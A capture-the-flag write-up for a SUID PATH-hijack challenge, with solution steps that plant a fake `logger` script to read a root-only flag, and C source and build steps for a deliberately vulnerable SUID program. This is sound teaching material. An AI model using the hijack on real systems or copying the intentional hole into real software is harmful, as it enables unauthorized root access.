# Challenge 10 — SUID PATH Hijack

## Description
Exploit a SUID root program that calls `logger` without a full path. By putting a fake `logger` earlier in `PATH`, the program runs your script as root and reveals the flag.

# Solution
Follow these steps inside the running container as user `ctfuser`.

1. Read the breadcrumbs to understand the hint about `logger` and `PATH`.
   ```bash
   cat /home/ctfuser/README.txt
   cat /opt/notes/sysadmin_note.txt
   ```

2. Confirm there is a SUID binary.
   ```bash
   ls -l /usr/local/bin/vuln
   # expect: -rwsr-xr-x root root ... /usr/local/bin/vuln
   ```
   The `s` shows it runs with root privileges.

3. Notice that it calls `logger` and likely relies on `PATH`.
   ```bash
   strings /usr/local/bin/vuln | grep -i logger || echo "Proceed even if nothing prints"
   ```

4. Create a fake `logger` that copies the flag to a readable file.
   ```bash
   cat > ~/logger <<'EOF'
   #!/usr/bin/env bash
   set -euo pipefail
   cat /root/flag.txt > /tmp/flag.out
   EOF
   chmod +x ~/logger
   ```

5. Put your home directory first in `PATH` and confirm resolution.
   ```bash
   export PATH="$HOME:$PATH"
   command -v logger     # should print /home/ctfuser/logger
   ```

6. Run the SUID program and read the flag.
   ```bash
   /usr/local/bin/vuln
   cat /tmp/flag.out
   ```

**Logic:** The SUID program executes with root’s effective (and real) UID. It calls `logger` without a full path, so the system searches `PATH`. Because your `~/logger` appears first, it runs your script as root and copies `/root/flag.txt` to `/tmp/flag.out`.

# Recreating this challenge
These steps describe how to rebuild the challenge at a high level (no `build.sh`). Use Alpine to keep the image small and Bash for consistency.

1. Create project structure and files.
   - `flag.txt` containing the secret flag (e.g., `flag{suid_path_hijack_works}`).
   - `README.txt` with a short note mentioning that the tool relies on `logger`.
   - `/opt/notes/sysadmin_note.txt` reminding to hardcode full paths for privileged tools.

2. Write the vulnerable program `vuln.c`. It should set real and effective IDs to root, then call `execvp("logger", ...)` (not `system()`), so it searches `PATH` for `logger`.
   ```c
   #include <unistd.h>
   #include <stdio.h>

   int main(void) {
       if (setgid(0) != 0 || setuid(0) != 0) {
           perror("setuid/setgid");
           return 1;
       }
       char *argv[] = {"logger", "-t", "vuln", "user-ran-vuln", NULL};
       execvp("logger", argv);
       perror("execvp");
       return 127;
   }
   ```

3. Build the binary in a temporary builder stage.
   - Base: `alpine:3.20`
   - Install `build-base`
   - Compile with `gcc -O2 -s -o vuln vuln.c`

4. Create the runtime image.
   - Base: `alpine:3.20`
   - Install `bash` (BusyBox already provides `logger`).
   - Create user `ctfuser` with home `/home/ctfuser`.
   - Copy `/root/flag.txt` and set permissions `600`.
   - Copy breadcrumbs to their paths.
   - Copy `/usr/local/bin/vuln` from builder.
   - Set owner to root and permissions to `4755` to enable SUID.
   - Set default user to `ctfuser`, workdir to `/home/ctfuser`, and keep the container alive with a simple Bash loop.

5. Design note (logical flaw and fix).
   - **Flaw found:** Using `system("logger ...")` on Alpine routes through `/bin/sh`, which may drop privileges, causing the fake `logger` to run as a normal user.
   - **Fix applied:** Use `setuid(0)/setgid(0)` and `execvp("logger", argv)` to call `logger` directly so the effective UID remains root while still relying on `PATH`. This preserves the intended vulnerability and keeps the challenge reliable across environments.
